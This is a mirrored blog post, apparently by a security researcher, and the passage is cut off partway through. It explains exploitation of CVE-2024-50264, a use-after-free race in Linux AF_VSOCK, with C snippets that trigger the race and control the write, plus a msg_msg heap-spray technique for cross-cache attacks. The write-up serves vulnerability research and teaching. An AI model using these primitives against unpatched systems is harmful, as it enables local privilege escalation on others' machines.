<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html">Original</a>
    <h1>Kernel-hack-drill and exploiting CVE-2024-50264 in the Linux kernel</h1>
    
    <div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher&#39;s life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project <a href="https://github.com/a13xp0p0v/kernel-hack-drill">kernel-hack-drill</a> and show how it helped me to exploit CVE-2024-50264.</p>

<h2 id="bug-collision-story">Bug collision story</h2>

<p>I first found a bug in <code>AF_VSOCK</code> back in 2021 and published the article <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel</a>. In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in <code>AF_VSOCK</code>. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (<code>kworker</code>), which didn&#39;t look security-relevant. Patching it properly would require significant rework in the <code>AF_VSOCK</code> subsystem. Convinced the path forward would be painful, I shelved the crash. This was a wrong decision.</p>

<p>Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I&#39;d collided with Hyunwoo Kim (<a href="https://x.com/v4bel">@v4bel</a>) and Wongi Lee (<a href="https://x.com/_qwerty_po">@qwerty</a>): they&#39;d already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/vmw_vsock?id=6ca575374dd9a507cdd16dfa0e78c2e9e20bd05f">Their patch</a> turned my PoC exploit into a null-ptr-deref:</p>

<center><img src="https://a13xp0p0v.github.io/img/vsock_patch.png" width="90%"/></center>


<p>Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.</p>

<center><img src="https://a13xp0p0v.github.io/img/Vityaz.jpg" width="80%"/></center>


<p>The <a href="https://github.com/google/security-research/pull/145/files">exploit strategy</a> by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.</p>

<h2 id="cve-2024-50264-analysis">CVE-2024-50264 analysis</h2>

<p>The vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-50264">CVE-2024-50264</a> was introduced in August 2016 by commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/vmw_vsock?id=06a8fc78367d070720af960dcecec917d3ae5f3b">06a8fc78367d</a> in Linux v4.8. It is a race condition in <code>AF_VSOCK</code> sockets that happens between the <code>connect()</code> system call and a POSIX signals, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.</p>

<p>The kernel uses a freed <code>virtio_vsock_sock</code> object. Its size is 80 bytes, which is suitable for the <code>kmalloc-96</code> slab cache. The memory corruption is a UAF write executed by a kernel worker.</p>

<p>However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that <strong>it&#39;s the worst bug to exploit I&#39;ve ever seen</strong>. The Pwnie Award is well-deserved. I&#39;ll outline those constraints shortly.</p>

<h2 id="reproducing-the-bug-using-an-immortal-signal">Reproducing the bug using an &#34;immortal signal&#34;</h2>

<p>First, an attacker should create a listening virtual socket (server vsock):</p>
<div><div><pre><code><span>int</span> <span>ret</span> <span>=</span> <span>-</span><span>1</span><span>;</span>
<span>int</span> <span>vsock1</span> <span>=</span> <span>0</span><span>;</span>

<span>vsock1</span> <span>=</span> <span>socket</span><span>(</span><span>AF_VSOCK</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>if</span> <span>(</span><span>vsock1</span> <span>&lt;</span> <span>0</span><span>)</span>
	<span>err_exit</span><span>(</span><span>&#34;[-] creating vsock&#34;</span><span>);</span>

<span>ret</span> <span>=</span> <span>bind</span><span>(</span><span>vsock1</span><span>,</span> <span>(</span><span>struct</span> <span>sockaddr</span> <span>*</span><span>)</span><span>&amp;</span><span>addr</span><span>,</span> <span>sizeof</span><span>(</span><span>struct</span> <span>sockaddr_vm</span><span>));</span>
<span>if</span> <span>(</span><span>ret</span> <span>!=</span> <span>0</span><span>)</span>
	<span>err_exit</span><span>(</span><span>&#34;[-] binding vsock&#34;</span><span>);</span>

<span>ret</span> <span>=</span> <span>listen</span><span>(</span><span>vsock1</span><span>,</span> <span>0</span><span>);</span> <span>/* backlog = 0 */</span>
<span>if</span> <span>(</span><span>ret</span> <span>!=</span> <span>0</span><span>)</span>
	<span>err_exit</span><span>(</span><span>&#34;[-] listening vsock&#34;</span><span>);</span>
</code></pre></div></div>

<p>Then the attacker should try to open a connection from a client vsock:</p>
<div><div><pre><code><span>#define UAF_PORT 0x2712
</span>
<span>int</span> <span>vsock2</span> <span>=</span> <span>0</span><span>;</span>
<span>struct</span> <span>sockaddr_vm</span> <span>addr</span> <span>=</span> <span>{</span>
	<span>.</span><span>svm_family</span> <span>=</span> <span>AF_VSOCK</span><span>,</span>
	<span>.</span><span>svm_port</span> <span>=</span> <span>UAF_PORT</span><span>,</span>
	<span>.</span><span>svm_cid</span> <span>=</span> <span>VMADDR_CID_LOCAL</span>
<span>};</span>

<span>vsock2</span> <span>=</span> <span>socket</span><span>(</span><span>AF_VSOCK</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>if</span> <span>(</span><span>vsock2</span> <span>&lt;</span> <span>0</span><span>)</span>
	<span>err_exit</span><span>(</span><span>&#34;[-] creating vsock&#34;</span><span>);</span>

<span>ret</span> <span>=</span> <span>connect</span><span>(</span><span>vsock2</span><span>,</span> <span>(</span><span>struct</span> <span>sockaddr</span> <span>*</span><span>)</span><span>&amp;</span><span>addr</span><span>,</span> <span>sizeof</span><span>(</span><span>struct</span> <span>sockaddr_vm</span><span>));</span>
</code></pre></div></div>

<p>To trigger the bug, the attacker should interrupt this <code>connect()</code> system call with a POSIX signal. @v4bel &amp; @qwerty used <code>SIGKILL</code>, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:</p>

<div><div><pre><code><span>struct</span> <span>sigevent</span> <span>sev</span> <span>=</span> <span>{};</span>
<span>timer_t</span> <span>race_timer</span> <span>=</span> <span>0</span><span>;</span>

<span>sev</span><span>.</span><span>sigev_notify</span> <span>=</span> <span>SIGEV_SIGNAL</span><span>;</span>
<span>sev</span><span>.</span><span>sigev_signo</span> <span>=</span> <span>33</span><span>;</span>
<span>ret</span> <span>=</span> <span>timer_create</span><span>(</span><span>CLOCK_MONOTONIC</span><span>,</span> <span>&amp;</span><span>sev</span><span>,</span> <span>&amp;</span><span>race_timer</span><span>);</span>
</code></pre></div></div>

<p>My fuzzer discovered that a timer can fire signal 33 and interrupt <code>connect()</code>. Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As <code>man 7 nptl</code> explains:</p>

<blockquote>
  <p>NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33).
One of these signals is used to support thread cancellation and POSIX timers (see <code>timer_create(2)</code>);
the other is used as part of a mechanism that ensures all threads in a process always have
the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.</p>
</blockquote>

<p>True, these signals cannot be used in applications, but they are perfect for my exploit 😉</p>

<center><img src="https://a13xp0p0v.github.io/img/secret.jpeg" width="50%"/></center>


<p>I use <code>timer_settime()</code> for <code>race_timer</code>, which lets me choose the exact moment signal 33 interrupts <code>connect()</code>. Moreover, the signal is invisible to the exploit process and doesn&#39;t kill it.</p>

<h2 id="about-memory-corruption">About memory corruption</h2>

<p>The race condition succeeds when a signal interrupts the <code>connect()</code> system call while the vulnerable socket is in the <code>TCP_ESTABLISHED</code> state. The socket then <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/af_vsock.c#L1475">drops into</a> the <code>TCP_CLOSING</code> state:</p>

<div><div><pre><code><span>if</span> <span>(</span><span>signal_pending</span><span>(</span><span>current</span><span>))</span> <span>{</span>
	<span>err</span> <span>=</span> <span>sock_intr_errno</span><span>(</span><span>timeout</span><span>);</span>
	<span>sk</span><span>-&gt;</span><span>sk_state</span> <span>=</span> <span>sk</span><span>-&gt;</span><span>sk_state</span> <span>==</span> <span>TCP_ESTABLISHED</span> <span>?</span> <span>TCP_CLOSING</span> <span>:</span> <span>TCP_CLOSE</span><span>;</span>
	<span>sock</span><span>-&gt;</span><span>state</span> <span>=</span> <span>SS_UNCONNECTED</span><span>;</span>
	<span>vsock_transport_cancel_pkt</span><span>(</span><span>vsk</span><span>);</span>
	<span>vsock_remove_connected</span><span>(</span><span>vsk</span><span>);</span>
	<span>goto</span> <span>out_wait</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The second attempt to connect the vulnerable vsock to the server vsock using a different <code>svm_cid</code> (<code>VMADDR_CID_HYPERVISOR</code>) provokes memory corruption.</p>

<div><div><pre><code><span>struct</span> <span>sockaddr_vm</span> <span>addr</span> <span>=</span> <span>{</span>
	<span>.</span><span>svm_family</span> <span>=</span> <span>AF_VSOCK</span><span>,</span>
	<span>.</span><span>svm_port</span> <span>=</span> <span>UAF_PORT</span><span>,</span>
	<span>.</span><span>svm_cid</span> <span>=</span> <span>VMADDR_CID_HYPERVISOR</span>
<span>};</span>

<span>/* this connect will schedule the kernel worker performing UAF */</span>
<span>ret</span> <span>=</span> <span>connect</span><span>(</span><span>vsock2</span><span>,</span> <span>(</span><span>struct</span> <span>sockaddr</span> <span>*</span><span>)</span><span>&amp;</span><span>addr</span><span>,</span> <span>sizeof</span><span>(</span><span>struct</span> <span>sockaddr_vm</span><span>));</span>
</code></pre></div></div>

<p>Under the hood, the <code>connect()</code> system call <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/af_vsock.c#L439">executes</a> <code>vsock_assign_transport()</code>. This function switches the virtual socket to the new <code>svm_cid</code> transport and frees the resources tied to the previous vsock transport:</p>
<div><div><pre><code><span>if</span> <span>(</span><span>vsk</span><span>-&gt;</span><span>transport</span><span>)</span> <span>{</span>
	<span>if</span> <span>(</span><span>vsk</span><span>-&gt;</span><span>transport</span> <span>==</span> <span>new_transport</span><span>)</span>
		<span>return</span> <span>0</span><span>;</span>

	<span>/* transport-&gt;release() must be called with sock lock acquired.
	 * This path can only be taken during vsock_connect(), where we
	 * have already held the sock lock. In the other cases, this
	 * function is called on a new socket which is not assigned to
	 * any transport.
	 */</span>
	<span>vsk</span><span>-&gt;</span><span>transport</span><span>-&gt;</span><span>release</span><span>(</span><span>vsk</span><span>);</span>
	<span>vsock_deassign_transport</span><span>(</span><span>vsk</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This procedure <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1214">closes</a> the old vsock transport in <code>virtio_transport_close()</code> and <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1085">frees</a> the <code>virtio_vsock_sock</code> object in <code>virtio_transport_destruct()</code>. However, due to the erroneous <code>TCP_CLOSING</code> state of the socket, <code>virtio_transport_close()</code> initiates further communication. To handle that activity, the kernel schedules a <code>kworker</code> that eventually calls <code>virtio_transport_space_update()</code>, which <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1434">operates</a> on the freed structure:</p>

<div><div><pre><code><span>static</span> <span>bool</span> <span>virtio_transport_space_update</span><span>(</span><span>struct</span> <span>sock</span> <span>*</span><span>sk</span><span>,</span> <span>struct</span> <span>sk_buff</span> <span>*</span><span>skb</span><span>)</span>
<span>{</span>
	<span>struct</span> <span>virtio_vsock_hdr</span> <span>*</span><span>hdr</span> <span>=</span> <span>virtio_vsock_hdr</span><span>(</span><span>skb</span><span>);</span>
	<span>struct</span> <span>vsock_sock</span> <span>*</span><span>vsk</span> <span>=</span> <span>vsock_sk</span><span>(</span><span>sk</span><span>);</span>
	<span>struct</span> <span>virtio_vsock_sock</span> <span>*</span><span>vvs</span> <span>=</span> <span>vsk</span><span>-&gt;</span><span>trans</span><span>;</span> <span>/* ptr to freed object */</span>
	<span>bool</span> <span>space_available</span><span>;</span>

	<span>if</span> <span>(</span><span>!</span><span>vvs</span><span>)</span>
		<span>return</span> <span>true</span><span>;</span>

	<span>spin_lock_bh</span><span>(</span><span>&amp;</span><span>vvs</span><span>-&gt;</span><span>tx_lock</span><span>);</span> <span>/* proceed if 4 bytes are zero (UAF write non-zero to lock) */</span>
	<span>vvs</span><span>-&gt;</span><span>peer_buf_alloc</span> <span>=</span> <span>le32_to_cpu</span><span>(</span><span>hdr</span><span>-&gt;</span><span>buf_alloc</span><span>);</span> <span>/* UAF write 4 bytes */</span>
	<span>vvs</span><span>-&gt;</span><span>peer_fwd_cnt</span> <span>=</span> <span>le32_to_cpu</span><span>(</span><span>hdr</span><span>-&gt;</span><span>fwd_cnt</span><span>);</span> <span>/* UAF write 4 bytes */</span>
	<span>space_available</span> <span>=</span> <span>virtio_transport_has_space</span><span>(</span><span>vsk</span><span>);</span> <span>/* UAF read, not interesting */</span>
	<span>spin_unlock_bh</span><span>(</span><span>&amp;</span><span>vvs</span><span>-&gt;</span><span>tx_lock</span><span>);</span> <span>/* UAF write, restore 4 zero bytes */</span>
	<span>return</span> <span>space_available</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The following diagram shows the layout of the UAF in the vulnerable object:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write.png"/></center>


<p>Here in yellow I show the <code>tx_lock</code> field that must be zero. Otherwise, the kernel hangs while trying to acquire the spinlock. In red I show the <code>peer_buf_alloc</code> and <code>peer_fwd_cnt</code> fields that are overwritten after the object is freed. There is no pointer dereference in the freed object.</p>

<p>The value written to <code>virtio_vsock_sock.peer_buf_alloc</code> can be controlled from the userspace:</p>

<div><div><pre><code><span>/* Increase the range for the value that we want to write during UAF: */</span>
<span>uaf_val_limit</span> <span>=</span> <span>0x1lu</span><span>;</span> <span>/* can&#39;t be zero */</span>
<span>setsockopt</span><span>(</span><span>vsock1</span><span>,</span> <span>PF_VSOCK</span><span>,</span> <span>SO_VM_SOCKETS_BUFFER_MIN_SIZE</span><span>,</span>
           <span>&amp;</span><span>uaf_val_limit</span><span>,</span> <span>sizeof</span><span>(</span><span>uaf_val_limit</span><span>));</span>
<span>uaf_val_limit</span> <span>=</span> <span>0xfffffffflu</span><span>;</span>
<span>setsockopt</span><span>(</span><span>vsock1</span><span>,</span> <span>PF_VSOCK</span><span>,</span> <span>SO_VM_SOCKETS_BUFFER_MAX_SIZE</span><span>,</span>
           <span>&amp;</span><span>uaf_val_limit</span><span>,</span> <span>sizeof</span><span>(</span><span>uaf_val_limit</span><span>));</span>

<span>/* Set the 4-byte value that we want to write during UAF: */</span>
<span>setsockopt</span><span>(</span><span>vsock1</span><span>,</span> <span>PF_VSOCK</span><span>,</span> <span>SO_VM_SOCKETS_BUFFER_SIZE</span><span>,</span>
           <span>&amp;</span><span>uaf_val</span><span>,</span> <span>sizeof</span><span>(</span><span>uaf_val</span><span>));</span>
</code></pre></div></div>

<p>The field <code>virtio_vsock_sock.peer_fwd_cnt</code> tracks how many bytes have been pushed through vsock using <code>sendmsg()</code>/<code>recvmsg()</code>. It is zero by default (four zero bytes).</p>

<h2 id="not-so-fast-cve-2024-50264-has-limitations">Not so fast. CVE-2024-50264 has limitations</h2>

<p>As I mentioned earlier, this vulnerability has a lot of nasty limitations for the exploitation:</p>

<ol>
  <li>The vulnerable <code>virtio_vsock_sock</code> client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.</li>
  <li>Reproducing this race condition is very unstable.</li>
  <li>The UAF write occurs in a kworker a few microseconds after <code>kfree()</code>, too quickly for typical cross-cache attacks.</li>
  <li>A null-ptr-deref in the kworker follows the UAF write. That&#39;s why I shelved the bug at first.</li>
  <li>Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after <code>VSOCK_CLOSE_TIMEOUT</code> (eight seconds).</li>
  <li>The kworker hangs in <code>spin_lock_bh()</code> if <code>virtio_vsock_sock.tx_lock</code> is not zero, as noted above.</li>
</ol>

<p>I uncovered each obstacle one by one while developing the PoC exploit for CVE-2024-50264. It remains the worst bug to exploit I&#39;ve ever seen. I guess that&#39;s why it received the Pwnie Award 2025 as the Best Privilege Escalation.</p>

<center><img src="https://a13xp0p0v.github.io/img/mario.jpg" width="80%"/></center>


<h2 id="first-thoughts-on-exploit-strategy">First thoughts on exploit strategy</h2>

<p>The exploit strategy by @v4bel and @qwerty was complex:</p>

<ol>
  <li>A large-scale BPF JIT spray that filled a significant portion of physical memory</li>
  <li>The <a href="https://github.com/IAIK/SLUBStick">SLUBStick technique</a> from Graz University of Technology, which allowed to:
    <ul>
      <li>Determine the number of objects in the active slab using a timing side channel</li>
      <li>Then, place the client and server <code>virtio_vsock_sock</code> objects in different slabs, landing one at the end of its slab and the other at the start of the next slab</li>
    </ul>
  </li>
  <li>The <a href="https://web.archive.org/web/20250226150503/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty Pagetable</a> technique, which allowed to use the UAF object for overwriting a page table entry (PTE)</li>
  <li>Modifying a PTE to make it possibly point to a BPF JIT region</li>
  <li>Inserting a privilege-escalation payload into the BPF code</li>
  <li>Communicating via a socket to execute the privilege-escalation payload.</li>
</ol>

<center><img src="https://a13xp0p0v.github.io/img/grumpy12.jpeg" width="80%"/></center>


<p>I felt I could make the PoC exploit for CVE-2024-50264 much simpler. My first thought was to steer the UAF write into some victim object and build a useful exploit primitive around it.</p>

<p>I decided not to search victim objects inside the <code>kmalloc-96</code> slab cache. Ubuntu Server 24.04 ships with <code>kconfig</code> options that neutralize naive heap spraying for UAF exploitation:</p>
<ul>
  <li><code>CONFIG_SLAB_BUCKETS=y</code>, which creates a set of separate slab caches for allocations with user-controlled data</li>
  <li><code>CONFIG_RANDOM_KMALLOC_CACHES=y</code>. Here&#39;s a quote from the kernel documentation about it:
    <blockquote>
      <p>It is a hardening feature that creates multiple copies of slab caches for normal kmalloc allocation and makes kmalloc randomly pick one based on code address, which makes the attackers more difficult to spray vulnerable memory objects on the heap for the purpose of exploiting memory vulnerabilities.</p>
    </blockquote>
  </li>
</ul>

<p>That&#39;s why I decided to perform the cross-cache attack anyway.</p>

<p>The first victim object I decided to try was <code>struct cred</code>. Its size is 184 bytes, and the kernel allocates these objects in slabs of size 192 bytes. That would allow only two possible offsets of the UAF in the victim <code>cred</code>, because slabs for the vulnerable <code>virtio_vsock_sock</code> have size 96 bytes (half of 192). The diagram below shows how two vulnerable <code>virtio_vsock_sock</code> objects overlap the <code>cred</code> object. The memory corruption may happen on one of the <code>virtio_vsock_sock</code> objects.</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_cred2.png" width="80%"/></center>


<p>Unfortunately, <code>struct cred</code> reallocated at the place of the freed <code>virtio_vsock_sock</code> objects doesn&#39;t provide anything useful for the attacker:</p>
<ul>
  <li>If the UAF happened on the first <code>virtio_vsock_sock</code>, the kernel would hang in <code>spin_lock_bh()</code>, because <code>cred</code> has a non-null <code>uid</code> value at the place of <code>virtio_vsock_sock.tx_lock</code>.</li>
  <li>If the UAF happened on the second <code>virtio_vsock_sock</code>, writing controlled data to <code>virtio_vsock_sock.peer_buf_alloc</code> would corrupt the <code>cred.request_key_auth</code> pointer. I had no idea how to use it without a prior infoleak.</li>
</ul>

<p>The <code>cred</code> object didn&#39;t work for me, so I started to search for the next candidate. My next victim object for the memory corruption was <code>msg_msg</code>. I like this object: I first used it for heap spraying in 2021 (you can find the details in the article <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">&#34;Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel&#34;</a>).</p>

<p>It was a novel approach back then. This time, I set out to create something new again.</p>

<p>I chose a 96-byte <code>msg_msg</code> because the slab allocator would use slabs of the same size for this <code>msg_msg</code> and <code>virtio_vsock_sock</code>. That would allow the UAF write to land at a fixed offset in the victim <code>msg_msg</code> object. The following diagram shows what happens with the <code>msg_msg</code> object allocated at the place of the freed <code>virtio_vsock_sock</code>:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_msg_msg.png" width="90%"/></center>


<p>The <code>msg_msg.m_list.prev</code> is the kernelspace pointer to the previous object in the linked list. This pointer is zero when <code>msg_msg</code> is created (see <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</code>) and then it is initialized with a non-null value when <code>msg_msg</code> <a href="https://elixir.bootlin.com/linux/v6.15.5/source/ipc/msg.c#L941">is inserted</a> into the message queue. Unfortunately, this non-null pointer is interpreted as <code>virtio_vsock_sock.tx_lock</code>. That makes the <code>virtio_transport_space_update()</code> function hang while executing <code>spin_lock_bh()</code>.</p>

<p>To bypass this restriction, I needed the kernel to initialize <code>msg_msg.m_list.prev</code> after the UAF write. I looked for a way to postpone placing <code>msg_msg</code> in the message queue and eventually found the solution.</p>

<h2 id="msg_msg-spray-allowing-m_list-field-corruption-novel-technique">msg_msg spray allowing m_list field corruption (novel technique)</h2>

<ol>
  <li>I filled the message queue almost completely before sending the target <code>msg_msg</code>.
    <ul>
      <li>The message queue size is <code>MSGMNB=16384</code> bytes.</li>
      <li>I sent 2 clogging messages of 8191 bytes each without calling the <code>msgrcv()</code> syscall.</li>
      <li>Only 2 bytes were left in the queue.</li>
      <li>I used <code>mtype = 1</code> for these messages.</li>
    </ul>
  </li>
  <li>Then I performed spraying by calling <code>msgsnd()</code> for the target <code>msg_msg</code> objects.
    <ul>
      <li>I called the <code>msgsnd()</code> syscall in separate pthreads and used <code>mtype = 2</code> for these messages to distinguish them from the clogging messages.</li>
      <li>The kernel allocates target <code>msg_msg</code> and then blocks <code>msgsnd()</code> in <code>ipc/msg.c</code> while it <a href="https://elixir.bootlin.com/linux/v6.15.5/source/ipc/msg.c#L900">waits for space</a> in the message queue:</li>
    </ul>

    <div><div><pre><code> 	<span>if</span> <span>(</span><span>msg_fits_inqueue</span><span>(</span><span>msq</span><span>,</span> <span>msgsz</span><span>))</span>
 		<span>break</span><span>;</span>
    
 	<span>/* queue full, wait: */</span>
 	<span>if</span> <span>(</span><span>msgflg</span> <span>&amp;</span> <span>IPC_NOWAIT</span><span>)</span> <span>{</span>
 		<span>err</span> <span>=</span> <span>-</span><span>EAGAIN</span><span>;</span>
 		<span>goto</span> <span>out_unlock0</span><span>;</span>
 	<span>}</span>
    
 	<span>/* enqueue the sender and prepare to block */</span>
 	<span>ss_add</span><span>(</span><span>msq</span><span>,</span> <span>&amp;</span><span>s</span><span>,</span> <span>msgsz</span><span>);</span>
    
 	<span>if</span> <span>(</span><span>!</span><span>ipc_rcu_getref</span><span>(</span><span>&amp;</span><span>msq</span><span>-&gt;</span><span>q_perm</span><span>))</span> <span>{</span>
 		<span>err</span> <span>=</span> <span>-</span><span>EIDRM</span><span>;</span>
 		<span>goto</span> <span>out_unlock0</span><span>;</span>
 	<span>}</span>
    
 	<span>ipc_unlock_object</span><span>(</span><span>&amp;</span><span>msq</span><span>-&gt;</span><span>q_perm</span><span>);</span>
 	<span>rcu_read_unlock</span><span>();</span>
 	<span>schedule</span><span>();</span>
</code></pre></div>    </div>

    <center><img src="https://a13xp0p0v.github.io/img/train_msg_msg.jpg" width="80%"/></center>
    
  </li>
  <li>
    <p>While the <code>msgsnd()</code> syscalls were waiting for space in the message queue, I performed the UAF write corrupting the <code>m_list</code>, <code>m_type</code>, and <code>m_ts</code> fields of one of the target <code>msg_msg</code> objects.</p>
  </li>
  <li>
    <p>After the UAF write, I called <code>msgrcv()</code> for type 1 clogging messages.</p>
  </li>
  <li>Then the blocked <code>msgsnd()</code> syscall woke up to add the sprayed <code>msg_msg</code> to the queue and <a href="https://elixir.bootlin.com/linux/v6.15.5/source/ipc/msg.c#L941">the kernel fixed</a> the corrupted <code>m_list</code> field:
    <div><div><pre><code> 	<span>if</span> <span>(</span><span>!</span><span>pipelined_send</span><span>(</span><span>msq</span><span>,</span> <span>msg</span><span>,</span> <span>&amp;</span><span>wake_q</span><span>))</span> <span>{</span>
 		<span>/* no one is waiting for this message, enqueue it */</span>
 		<span>list_add_tail</span><span>(</span><span>&amp;</span><span>msg</span><span>-&gt;</span><span>m_list</span><span>,</span> <span>&amp;</span><span>msq</span><span>-&gt;</span><span>q_messages</span><span>);</span>
 		<span>msq</span><span>-&gt;</span><span>q_cbytes</span> <span>+=</span> <span>msgsz</span><span>;</span>
 		<span>msq</span><span>-&gt;</span><span>q_qnum</span><span>++</span><span>;</span>
 		<span>percpu_counter_add_local</span><span>(</span><span>&amp;</span><span>ns</span><span>-&gt;</span><span>percpu_msg_bytes</span><span>,</span> <span>msgsz</span><span>);</span>
 		<span>percpu_counter_add_local</span><span>(</span><span>&amp;</span><span>ns</span><span>-&gt;</span><span>percpu_msg_hdrs</span><span>,</span> <span>1</span><span>);</span>
 	<span>}</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>Cool! This technique is also useful for blind overwriting of <code>msg_msg</code> using the out-of-bounds write. No kernel infoleak is needed. The kernel restores the corrupted <code>m_list</code> pointers. In my particular case, this approach allowed me to avoid <code>virtio_transport_space_update()</code> hanging in <code>spin_lock_bh()</code>:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_msg_msg2.png" width="90%"/></center>


<p>To implement the UAF write into an <code>msg_msg</code> object, I needed to perform cross-cache attack turning <code>virtio_vsock_sock</code> into <code>msg_msg</code>. On Ubuntu Server 24.04, the <code>virtio_vsock_sock</code> objects live in one of 16 <code>kmalloc-rnd-?-96</code> slab caches enabled by <code>CONFIG_RANDOM_KMALLOC_CACHES</code>. The <code>msg_msg</code> objects live in a dedicated <code>msg_msg-96</code> slab cache enabled by <code>CONFIG_SLAB_BUCKETS</code>.</p>

<p>To implement the cross-cache attack, I needed to learn how these attacks work on the latest Ubuntu kernel, but testing exploit primitives together with this crazy race condition was really painful. Then, I got an idea:</p>

<blockquote>
  <p>If an unstable race condition creates problems, let&#39;s use a testing ground for developing the exploit primitives!</p>
</blockquote>

<h2 id="kernel-hack-drill">Kernel Hack Drill</h2>

<p>Back in 2017, I created a pet project for my students called <a href="https://github.com/a13xp0p0v/kernel-hack-drill">kernel-hack-drill</a>. It provides a test environment for learning and experimenting with Linux kernel exploits. I remembered it and decided to use <code>kernel-hack-drill</code> to develop the exploit primitives for CVE-2024-50264.</p>

<p><code>kernel-hack-drill</code> is an open-source project published under the <code>GPL-3.0</code> license. It contains the following parts:</p>
<ul>
  <li><code>drill_mod.c</code> is a small Linux kernel module that provides the <code>/proc/drill_act</code> file as a simple interface to userspace. This module contains vulnerabilities that you can control and experiment with.</li>
  <li><code>drill.h</code> is a header file describing the <code>drill_mod.ko</code> interface:
    <div><div><pre><code><span>enum</span> <span>drill_act_t</span> <span>{</span>
	<span>DRILL_ACT_NONE</span> <span>=</span> <span>0</span><span>,</span>
	<span>DRILL_ACT_ALLOC</span> <span>=</span> <span>1</span><span>,</span>
	<span>DRILL_ACT_CALLBACK</span> <span>=</span> <span>2</span><span>,</span>
	<span>DRILL_ACT_SAVE_VAL</span> <span>=</span> <span>3</span><span>,</span>
	<span>DRILL_ACT_FREE</span> <span>=</span> <span>4</span><span>,</span>
	<span>DRILL_ACT_RESET</span> <span>=</span> <span>5</span>
<span>};</span>
  
<span>#define DRILL_ITEM_SIZE 95
</span>  
<span>struct</span> <span>drill_item_t</span> <span>{</span>
	<span>unsigned</span> <span>long</span> <span>foobar</span><span>;</span>
	<span>void</span> <span>(</span><span>*</span><span>callback</span><span>)(</span><span>void</span><span>);</span>
	<span>char</span> <span>data</span><span>[];</span> <span>/* C99 flexible array */</span>
<span>};</span>
  
<span>#define DRILL_N 10240
</span></code></pre></div>    </div>
  </li>
  <li><code>drill_test.c</code> is a userspace test for <code>drill_mod.ko</code> that provides the examples of using <code>/proc/drill_act</code>. This test doesn&#39;t provoke memory corruptions in <code>drill_mod.ko</code> and it passes if <code>CONFIG_KASAN=y</code>.</li>
  <li><code>README.md</code> includes a detailed step-by-step setup guide on how to use <code>kernel-hack-drill</code> (kudos to the contributors!).</li>
</ul>

<p>Fun fact: when I chose the name <code>kernel-hack-drill</code> for this project, I used the word <code>drill</code> to mean <code>training</code> or <code>workout</code> for Linux kernel security. My friends and students read it differently. They thought I meant something like this:</p>

<center><img src="https://a13xp0p0v.github.io/img/drill_tux.jpg" width="60%"/></center>


<p>The <code>kernel-hack-drill</code> project is a bit similar to <a href="https://github.com/hacktivesec/KRWX">KRWX</a>, but much simpler. Moreover, it ships with ready-made PoC exploits:</p>
<ul>
  <li><code>drill_uaf_callback.c</code>: a UAF exploit that invokes a callback inside a freed <code>drill_item_t</code> structure. It hijacks control flow and gains LPE.</li>
  <li><code>drill_uaf_w_msg_msg.c</code>: a UAF exploit that writes into a freed <code>drill_item_t</code>. It uses a cross-cache attack and overwrites <code>msg_msg.m_ts</code> enabling out-of-bounds reading of the kernel memory. I wrote this PoC while working on the bug described in this article.</li>
